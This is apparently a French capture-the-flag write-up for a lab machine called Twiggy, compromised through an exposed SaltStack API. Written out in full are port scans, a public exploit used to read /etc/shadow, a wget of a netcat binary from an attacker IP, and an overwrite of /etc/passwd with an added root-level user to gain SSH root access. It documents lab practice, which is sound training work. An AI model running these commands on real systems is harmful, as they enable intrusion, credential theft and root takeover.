  # Twiggy

	sudo masscan -p1-65535,U:1-65535 192.168.164.62 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.164.62 -oN nmap.txt
	feroxbuster --silent -u http://192.168.164.62
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh OpenSSH 7.4 (protocol 2.0)  
    53/tcp open domain NLnet Labs NSD  
    80/tcp open http nginx 1.16.1  
    4505/tcp open zmtp ZeroMQ ZMTP 2.0  
    4506/tcp open zmtp ZeroMQ ZMTP 2.0  
    8000/tcp open http nginx 1.16.1

Il y a une API sur le port 8000 : 

    {"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

En recopiant le contenu de cette page sur Google on tombe sur plein de résultats liés à SaltStack, qui est apparemment un outil de gestion de configuration écrit en Python. 

J'ai trouvé un exploit : https://www.exploit-db.com/exploits/48421

Impossible de faire télécharger quoi que ce soit à la machine mais je peux lire et écrire dans les fichiers :

	python  exploit_Saltstack.py --master 192.168.164.62 --exec "wget http://192.168.45.214/nc_linux"
	...
	python  exploit_Saltstack.py --master 192.168.164.62 --read /etc/passwd
	python  exploit_Saltstack.py --master 192.168.164.62 --read /etc/shadow
	python  exploit_Saltstack.py --master 192.168.164.62 --upload-src test.txt --upload-dest ./test.txt
	
J'ai donc directement pensé à la technique du remplacement de /etc/passwd et cela a fonctionné : 

	python exploit_Saltstack.py --master 192.168.164.62 --read /etc/passwd > passwd
	
	vim passwd
	echo 'tim:$1$cNCh34ba$5KLgSZbxX0baUnEB66yoZ1:0:0:/root/:/bin/bash' >> passwd
	
	python exploit_Saltstack.py --master 192.168.164.62 --upload-src ./passwd --upload-dest ../../../../etc/passwd
	...
	ssh -l tim 192.168.164.62
	cat /root/proof.txt
	
